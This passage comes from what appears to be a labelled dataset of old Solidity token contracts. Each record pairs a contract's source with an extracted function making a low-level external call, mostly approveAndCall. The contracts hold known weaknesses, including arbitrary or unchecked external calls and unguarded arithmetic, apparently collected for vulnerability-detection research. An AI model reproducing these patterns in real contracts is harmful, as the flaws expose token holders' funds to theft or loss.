  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 500000000000;\n totalSupply = 500000000000;\n name = \"The Boys\";\n decimals = 4;\n symbol = \"DDTB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15cf"
  },
  "filename": "35722.sol",
  "content": "contract CoinContract {\n bool private workingState = false;\n address public owner;\n address public proxy;\n uint256 public x = 100;\n mapping (address => uint256) private etherClients;\n event FundsGot(address indexed _sender, uint256 _value);\n event ContractEnabled();\n event ContractDisabled();\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier proxyAndOwner {\n require((msg.sender == proxy)||(msg.sender == owner));\n _;\n }\n modifier workingFlag {\n require(workingState == true);\n _;\n }\n function CoinContract() {\n owner = msg.sender;\n enableContract();\n }\n function kill() public onlyOwner {\n require(workingState == false);\n selfdestruct(owner);\n }\n function enableContract() onlyOwner {\n workingState = true;\n ContractEnabled();\n }\n function disableContract() onlyOwner {\n workingState = false;\n ContractDisabled();\n }\n function setProxy(address _proxy) onlyOwner {\n proxy = _proxy;\n }\n function pay(address _client, uint256 _amount) workingFlag returns (bool ret) {\n require(x > 0);\n etherClients[_client] += _amount;\n uint256 value = x * _amount;\n FundsGot(_client, etherClients[_client]);\n ret = proxy.call(bytes4(sha3(\"generateTokens(address,uint256)\")), _client, value);\n }\n function getSenderFunds(address _sender) workingFlag returns (uint256 amount) {\n return etherClients[_sender];\n }\n function universalCall(string data) proxyAndOwner workingFlag returns (bool result) {\n data;\n bool ret = false;\n return ret;\n }\n}",
  "extract_feature": [
    "function pay(address _client, uint256 _amount) workingFlag returns (bool ret) {\nrequire(x > 0);\netherClients[_client] += _amount;\nuint256 value = x * _amount;\nFundsGot(_client, etherClients[_client]);\nret = proxy.call(bytes4(sha3(\"generateTokens(address,uint256)\")), _client, value);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15d0"
  },
  "filename": "35780.sol",
  "content": "pragma solidity ^0.4.17;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract STOAR is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'STOAR 1.0';\n function STOAR(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 100000000;\n name = \"STOAR\";\n decimals = 0;\n symbol = \"STOAR\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15d1"
  },
  "filename": "35808.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ThiccCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ThiccCoin(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 1000000000;\n name = \"ThiccCoin\";\n decimals = 3;\n symbol = \"THICC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15d2"
  },
  "filename": "35831.sol",
  "content": "library SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) constant returns (uint256);\n function transfer(address to, uint256 value) returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) returns (bool);\n function approve(address spender, uint256 value) returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) returns (bool) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) allowed;\n function transferFrom(address _from, address _to, uint256 _value) returns (bool) {\n var _allowance = allowed[_from][msg.sender];\n balances[_to] = balances[_to].add(_value);\n balances[_from] = balances[_from].sub(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n return true;\n }\n function finishMinting() onlyOwner returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract TGEToken is MintableToken {\n string public name;\n uint8 public decimals = 18;\n string public symbol;\n string public version = \"H0.1\";\n function TGEToken(\n string _tokenName,\n string _tokenSymbol\n ) {\n name = _tokenName;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n assert(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n function burn(uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n totalSupply -= _value;\n Transfer(msg.sender, 0x0, _value);\n return true;\n } else {\n return false;\n }\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(0x0, _to, _amount);\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nassert(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15d3"
  },
  "filename": "35838.sol",
  "content": "pragma solidity ^0.4.16;\ncontract EROSCOINToken {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\nlibrary EROMaths {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b > 0);\n uint256 c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n address public newOwner;\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier validAddress(address _address) {\n require(_address != 0x0);\n _;\n }\n function transferOwnership(address _newOwner) onlyOwner {\n if (_newOwner != address(0)) {\n owner = _newOwner;\n }\n }\n function acceptOwnership() {\n require(msg.sender == newOwner);\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n event OwnershipTransferred(address indexed _from, address indexed _to);\n}\ncontract EroStandardToken is EROSCOINToken, Ownable {\n using EROMaths for uint256;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n mapping (address => bool) public frozenAccount;\n event FrozenFunds(address target, bool frozen);\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function freezeAccount(address target, bool freeze) onlyOwner {\n frozenAccount[target] = freeze;\n FrozenFunds(target, freeze);\n }\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (frozenAccount[msg.sender]) return false;\n require(\n (balances[msg.sender] >= _value)\n && (_value > 0)\n && (_to != address(0))\n && (balances[_to].add(_value) >= balances[_to])\n && (msg.data.length >= (2 * 32) + 4));\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (frozenAccount[msg.sender]) return false;\n require(\n (allowed[_from][msg.sender] >= _value)\n && (balances[_from] >= _value)\n && (_value > 0)\n && (_to != address(0))\n && (balances[_to].add(_value) >= balances[_to])\n && (msg.data.length >= (2 * 32) + 4)\n );\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract EROSCOIN is EroStandardToken {\n uint256 constant public decimals = 8;\n uint256 public totalSupply = 24 * (10**7) * 10**8 ;\n string constant public name = \"EROSCOIN\";\n string constant public symbol = \"ERO\";\n string constant public version = \"v1.3\";\n function EROSCOIN(){\n balances[msg.sender] = totalSupply;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15d4"
  },
  "filename": "35875.sol",
  "content": "pragma solidity ^0.4.16;\ncontract EROSToken {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\nlibrary EROMaths {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b > 0);\n uint256 c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n address public newOwner;\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier validAddress(address _address) {\n require(_address != 0x0);\n _;\n }\n function transferOwnership(address _newOwner) onlyOwner {\n if (_newOwner != address(0)) {\n owner = _newOwner;\n }\n }\n function acceptOwnership() {\n require(msg.sender == newOwner);\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n event OwnershipTransferred(address indexed _from, address indexed _to);\n}\ncontract EroStandardToken is EROSToken, Ownable {\n using EROMaths for uint256;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n mapping (address => bool) public frozenAccount;\n event FrozenFunds(address target, bool frozen);\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function freezeAccount(address target, bool freeze) onlyOwner {\n frozenAccount[target] = freeze;\n FrozenFunds(target, freeze);\n }\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (frozenAccount[msg.sender]) return false;\n require(\n (balances[msg.sender] >= _value)\n && (_value > 0)\n && (_to != address(0))\n && (balances[_to].add(_value) >= balances[_to])\n && (msg.data.length >= (2 * 32) + 4));\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (frozenAccount[msg.sender]) return false;\n require(\n (allowed[_from][msg.sender] >= _value)\n && (balances[_from] >= _value)\n && (_value > 0)\n && (_to != address(0))\n && (balances[_to].add(_value) >= balances[_to])\n && (msg.data.length >= (2 * 32) + 4)\n );\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract ECToken is EroStandardToken {\n uint256 constant public decimals = 8;\n uint256 public totalSupply = 24 * (10**7) * 10**8 ;\n string constant public name = \"ECToken\";\n string constant public symbol = \"EC\";\n string constant public version = \"v1.1.5\";\n function ECToken(){\n balances[msg.sender] = totalSupply;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15d5"
  },
  "filename": "35892.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000;\n totalSupply = 10000000000000000;\n name = \"CrowdCoin\";\n decimals = 8;\n symbol = \"CRWD\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15d6"
  },
  "filename": "35913.sol",
  "content": "pragma solidity ^0.4.0;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract LolaCoin is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'L0.1';\n uint256 public constant TOTAL = 1000000000000000000000000000;\n function LolaCoin() {\n balances[msg.sender] = TOTAL;\n totalSupply = TOTAL;\n name = \"Lola Coin\";\n decimals = 18;\n symbol = \"LLC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15d7"
  },
  "filename": "35938.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"Justin Token\";\n decimals = 1;\n symbol = \"JOWG\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15d8"
  },
  "filename": "36012.sol",
